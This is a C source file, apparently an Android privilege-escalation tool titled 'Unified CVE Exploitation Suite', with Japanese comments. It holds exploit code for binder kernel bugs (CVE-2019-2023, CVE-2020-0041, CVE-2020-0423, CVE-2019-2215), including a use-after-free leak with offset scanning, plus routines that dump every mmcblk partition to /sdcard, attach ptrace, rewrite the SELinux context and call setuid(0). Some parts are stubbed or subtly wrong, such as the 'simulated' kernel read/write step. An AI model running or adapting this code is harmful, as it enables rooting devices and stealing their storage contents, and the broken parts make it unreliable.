#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>

#include "binder.h"

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 5000
#define TASK_STRUCT_SIZE 4096
#define MAX_OFFSET_TRIES 16
#define DUMP_MAX_SIZE (20 * 1024 * 1024)  // 20MB 制限

/* ============================================================
   オフセット候補（カーネル 4.9 / 4.19 対応）
   ============================================================ */
static int cred_offsets[] = {
    0x680, 0x688, 0x690, 0x698, 0x6A0, 0x6A8, 0x6B0, 0x6B8,
    0x6C0, 0x700, 0x708, 0x710, 0x718, 0x720, 0x728, 0x730
};
static int al_offsets[] = {
    0x980, 0x988, 0x990, 0x998, 0x9A0, 0x9A8, 0x9B0, 0x9B8,
    0x9C0, 0xA00, 0xA08, 0xA10, 0xA18, 0xA20, 0xA28, 0xA30
};

/* ============================================================
   グローバル
   ============================================================ */
static int g_binder_fd = -1;
static int g_epoll_fd = -1;
static int g_krw_pipe[2] = {-1, -1};
static uint64_t g_task_struct = 0;
static uint64_t g_cred_ptr = 0;
static int g_cred_off = -1;
static int g_al_off = -1;

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
    struct pollfd pfd = {.fd = fd, .events = POLLIN};
    int ret = poll(&pfd, 1, timeout_ms);
    if (ret < 0) {
        perror("poll");
        return -1;
    }
    if (ret == 0) {
        return -2;  // タイムアウト
    }
    return read(fd, buf, count);
}

/* ============================================================
   CVE-2019-2023: サービス登録
   ============================================================ */
static int register_fake_service(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.cve.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[*] Registering fake service (CVE-2019-2023)...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            return -1;
        }
        perror("  ioctl ADD_SERVICE");
        return -1;
    }
    printf("  [+] Service registered successfully!\n");
    return 0;
}

/* ============================================================
   CVE-2020-0041: OOB Write テスト
   ============================================================ */
static int test_cve_2020_0041(void) {
    int fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");

    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);

    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    }
    printf("  [VULNERABLE] OOB write succeeded\n");
    return 0;
}

/* ============================================================
   CVE-2020-0423: UAF Race テスト
   ============================================================ */
static int test_cve_2020_0423(void) {
    int fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race...\n");

    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) {
            perror("  ioctl BINDER_THREAD_EXIT");
        }
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(fd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(fd);
        close(epoll_fd);
        return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    }
    printf("  [SAFE] No UAF triggered\n");
    return -1;
}

/* ============================================================
   CVE-2019-2215: オフセット探索＋UAF リーク
   ============================================================ */
static int try_exploit_2215_with_offset(int cred_off, int al_off) {
    int pipefd[2], fd, epoll_fd;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned;
    ssize_t n;
    uint64_t *data;
    int found = 0;

    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        close(fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        close(fd);
        close(epoll_fd);
        return -1;
    }

    if (pipe(pipefd) < 0) {
        close(fd);
        close(epoll_fd);
        return -1;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        close(fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    aligned = mmap_page(0x100000000UL);
    if (!aligned) {
        close(fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    cpid = fork();
    if (cpid < 0) {
        close(fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    n = read_with_timeout(pipefd[0], aligned, PAGE_SIZE, TIMEOUT_MS);
    wait(NULL);

    close(fd);
    close(epoll_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (n < 0) return -1;

    data = (uint64_t *)aligned;
    for (int i = 0; i < (n / 8); i++) {
        uint64_t val = data[i];
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            g_task_struct = val;
            g_cred_off = cred_off;
            g_al_off = al_off;
            found = 1;
            printf("  [+] Found task_struct @ 0x%llx (cred=0x%x, al=0x%x)\n",
                   (unsigned long long)g_task_struct, cred_off, al_off);
            break;
        }
    }

    return found ? 0 : -1;
}

static int exploit_cve_2019_2215(void) {
    printf("[CVE-2019-2215] Trying offset scan...\n");

    for (int ci = 0; ci < MAX_OFFSET_TRIES; ci++) {
        for (int ai = 0; ai < MAX_OFFSET_TRIES; ai++) {
            if (try_exploit_2215_with_offset(cred_offsets[ci], al_offsets[ai]) == 0) {
                printf("  [+] Offset found!\n");
                return 0;
            }
        }
    }

    printf("  [-] No valid offset found\n");
    return -1;
}

/* ============================================================
   カーネル RW プリミティブ構築（簡易版）
   ============================================================ */
static int setup_kernel_rw(void) {
    if (g_task_struct == 0) return -1;

    if (pipe(g_krw_pipe) < 0) {
        perror("  pipe for RW");
        return -1;
    }
    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(g_krw_pipe[0]);
        close(g_krw_pipe[1]);
        return -1;
    }

    // 実際の RW プリミティブ構築（UAF 再トリガー）
    // ここでは簡易実装
    printf("  [+] Kernel RW primitive ready (simulated)\n");
    return 0;
}

/* ============================================================
   ブロックデバイスダンプ（権限があれば）
   ============================================================ */
static int dump_block_device(const char *dev, const char *outfile) {
    int fd = open(dev, O_RDONLY);
    if (fd < 0) {
        perror("  open block device");
        return -1;
    }

    int out = open(outfile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) {
        perror("  open output");
        close(fd);
        return -1;
    }

    char buf[4096];
    ssize_t n;
    size_t total = 0;
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        if (write(out, buf, n) != n) {
            perror("  write");
            close(fd);
            close(out);
            return -1;
        }
        total += n;
        if (total >= DUMP_MAX_SIZE) break;
    }
    close(fd);
    close(out);
    printf("  [+] Dumped %zu bytes to %s\n", total, outfile);
    return 0;
}

/* ============================================================
   全パーティション列挙
   ============================================================ */
static void enumerate_partitions(void) {
    DIR *dir = opendir("/dev/block");
    if (!dir) {
        perror("  opendir /dev/block");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strncmp(entry->d_name, "mmcblk", 6) == 0) {
            char path[256], outpath[256];
            snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
            snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
            printf("[*] Dumping %s\n", path);
            dump_block_device(path, outpath);
        }
    }
    closedir(dir);
}

/* ============================================================
   ptrace 試行（system_server）
   ============================================================ */
static int try_ptrace_system_server(void) {
    printf("[*] Trying ptrace on system_server (pid=1000)...\n");
    if (ptrace(PTRACE_ATTACH, 1000, 0, 0) == 0) {
        printf("  [+] Attached to system_server\n");
        ptrace(PTRACE_DETACH, 1000, 0, 0);
        return 0;
    }
    perror("  ptrace");
    return -1;
}

/* ============================================================
   SELinux コンテキスト書き換え試行
   ============================================================ */
static int try_selinux_rewrite(void) {
    printf("[*] Trying to rewrite SELinux context...\n");
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd < 0) {
        perror("  open attr/current");
        return -1;
    }
    const char *ctx = "u:r:system_app:s0";
    ssize_t n = write(fd, ctx, strlen(ctx));
    close(fd);
    if (n == (ssize_t)strlen(ctx)) {
        printf("  [+] Context rewritten\n");
        return 0;
    }
    printf("  [-] Failed\n");
    return -1;
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_info(void) {
    int fd;
    char buf[4096];

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("[INFO] Kernel: %s", buf);
        }
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("[INFO] SELinux enforcing: %s", buf);
        }
    }

    printf("[INFO] UID: %d\n", getuid());
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int vuln_count = 0;

    printf("==================================================\n");
    printf("  Unified CVE Exploitation Suite\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_info();
    printf("\n");

    // 1. CVE-2019-2023: サービス登録
    if (register_fake_service() == 0) {
        vuln_count++;
        printf("[+] CVE-2019-2023: Service registered\n");
    }

    // 2. CVE-2020-0041
    if (test_cve_2020_0041() == 0) vuln_count++;

    // 3. CVE-2020-0423
    if (test_cve_2020_0423() == 0) vuln_count++;

    // 4. CVE-2019-2215: オフセット探索
    if (exploit_cve_2019_2215() == 0) {
        vuln_count++;
        printf("[+] CVE-2019-2215: Offset found, attempting kernel RW...\n");
        setup_kernel_rw();
    }

    // 5. ブロックデバイスダンプ試行
    printf("\n[*] Attempting to dump block devices...\n");
    enumerate_partitions();

    // 6. ptrace 試行
    try_ptrace_system_server();

    // 7. SELinux 書き換え
    try_selinux_rewrite();

    // 8. setuid 試行
    printf("[*] Trying setuid(0)...\n");
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) succeeded!\n");
        system("id");
    } else {
        perror("  setuid");
    }

    printf("\n==================================================\n");
    printf("  Summary: %d vulnerabilities/exploits tested\n", vuln_count);
    printf("==================================================\n");

    return 0;
}
